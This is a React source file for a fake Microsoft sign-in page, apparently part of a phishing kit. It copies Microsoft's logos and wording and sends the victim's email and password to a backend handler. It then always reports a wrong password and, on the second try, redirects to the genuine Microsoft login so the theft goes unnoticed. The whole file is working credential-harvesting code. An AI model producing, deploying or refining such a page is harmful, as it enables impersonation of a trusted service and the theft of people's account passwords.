'use client';

import React, { useState, useRef } from 'react';

const SignInPage = () => {
  const [step, setStep] = useState<'username' | 'password'>('username');
  const [inputValue, setInputValue] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState(false);
  const [success, setSuccess] = useState(false);
  const [signInClicks, setSignInClicks] = useState(0);
  const inputRef = useRef<HTMLInputElement>(null);

  const handleNextClick = (event: React.MouseEvent<HTMLButtonElement>) => {
    event.preventDefault();

    if (!inputValue.trim()) {
      setError(true);
      setSuccess(false);
      inputRef.current?.focus();
    } else {
      setError(false);
      setSuccess(true);
      setStep('password');
    }
  };

  const handleSignInClick = async (event: React.MouseEvent<HTMLButtonElement>) => {
    event.preventDefault();

    if (!password.trim()) {
      setError(true);
      inputRef.current?.focus();
      return;
    }

    setError(false);
    setSignInClicks((prev) => prev + 1);

    if (signInClicks === 0) {
      // First attempt: check if password is not empty and show error if needed
      if (!password.trim()) {
        setError(true);
        return;
      }

      try {
        const response = await fetch('/api/handler', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({ inputValue, password }),
        });

        const result = await response.json();

        if (!response.ok) {
          throw new Error(result.message || 'Error from backend');
        }

        console.log('Response:', result.message);
        alert('Please type in correct password.');

        // Clear input fields after first click
        setPassword('');
        setError(false); // Clear any previous errors
      } catch (error) {
        console.error('Backend Error:', error);
        alert('Sign-in failed. Please try again.');
      }
    } else if (signInClicks === 1) {
      // Second attempt: redirect
      window.location.href =
        'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?...';
    }
  };

  return (
    <div className="signin-container">
      <div className="signin-block">
        <div className="logo-container">
          <img
            src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg"
            alt="Logo"
            className="logo"
          />
        </div>
        <form className="signin-form">
          {step === 'username' ? (
            <>
              <label className="signin-label">Sign in</label>
              {signInClicks === 0 && error && (
                <p className="error-text">Enter a valid email address, phone number, or Skype name.</p>
              )}

              {success && (
                <p className="success-text">Looks good! Proceeding to password step.</p> 
              )}

              <input
                ref={inputRef}
                type="text"
                placeholder="Email, phone, or Skype"
                className={`signin-input ${error ? 'error' : ''}`}
                value={inputValue}
                onChange={(e) => setInputValue(e.target.value)}
              />
              <div className="account-info">
                <p>No account?</p>
                <a href="#" className="create-account-link">
                  Create one!
                </a>
              </div>
              <a href="#" className="access-account-link">
                <p>Can`t access your account?</p>
              </a>
              <button
                type="button"
                className="signin-button"
                onClick={handleNextClick}
              >
                Next
              </button>
            </>
          ) : (
            <>
              <p className="input-display">You are signing in as: <strong>{inputValue}</strong></p>
              <label className="signin-label">Enter password</label>
              {!error && (
                <p className="error-text">Please enter the password for your account.</p>
              )}
              {error && (
                <p className="error-text">Please enter the password for your account.</p>
              )}
              <input
                ref={inputRef}
                type="password"
                placeholder="Password"
                className={`signin-input ${error ? 'error' : ''}`}
                value={password}
                onChange={(e) => setPassword(e.target.value)}
              />
              <a href="#" className="access-account-link">
                <p>Forgot password?</p>
              </a>
              <a href="#" className="access-email-link">
                <p>Email code to {inputValue}</p>
              </a>
              <a href="#" className="access-microsoft_account-link">
                <p>Sign in with a different Microsoft account</p>
              </a>
              <button
                type="button"
                className="signin-button"
                onClick={handleSignInClick}
              >
                Sign in
              </button>
            </>
          )}
        </form>
      </div>
      {step === 'username' && (
        <div className="signin-options">
          <a href="#" className="signin-options-link">
            <button className="signin-options-button">
              <img
                className="key-icon"
                src="https://aadcdn.msauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg"
                alt=""
              />
              <p className="signin-options-text">Sign-in options</p>
            </button>
          </a>
        </div>
      )}
    </div>
  );
};

export default SignInPage;
